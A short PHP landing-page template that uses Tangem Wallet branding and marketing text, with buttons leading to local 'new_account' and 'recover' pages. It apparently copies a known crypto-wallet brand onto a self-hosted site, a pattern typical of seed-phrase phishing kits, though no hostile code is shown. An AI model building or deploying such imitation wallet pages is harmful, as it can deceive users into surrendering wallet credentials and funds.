<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'The best crypto wallet — Tangem Wallet';
    include_once './includes/meta.php';
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="container-fluid">
            <div class="row">
                <div class="col-md-6 mt60">
                     <div class="row">
                        <div class="col-md-8 offset-md-2 mt60">
                            <div>
                                <h4 class="fs50 fw-semibold text-center mt40">Tangem your wallet</h4>
                                <div class="mt55 fs28 fw-bold lh40 text-secondary">Slim as a bank card, secure as a bank vault. Store, buy, earn, transfer and swap thousands of coins and tokens.</div>
                                <div class="text-center mx-auto d-grid gap-2 my50">
                                    <a href="<?=base_url('new_account.php')?>" class="btn btn-secondary bg-primary-3 rounded-pill btn-block fw-bold py10 fs17">Create a wallet</a>
                                    <a href="<?=base_url('recover.php')?>" class="btn btn-secondary bg-primary-3 rounded-pill btn-block fw-bold py10 fs17 mt20">Restore wallet</a>
                                </div>
                                <div class="mt60 fs20 lh30 text-secondary"><span class="text-white">A Tangem Wallet set can contain up to three Tangem cards.</span> You get three equal cards to one wallet, just like having three identical keys to your room door.</div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-sm-6">
                    <img src="<?= base_url('assets/img/t001.webp') ?>" class="img-fluid" style="max-height: calc(100vh - 61px);">
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>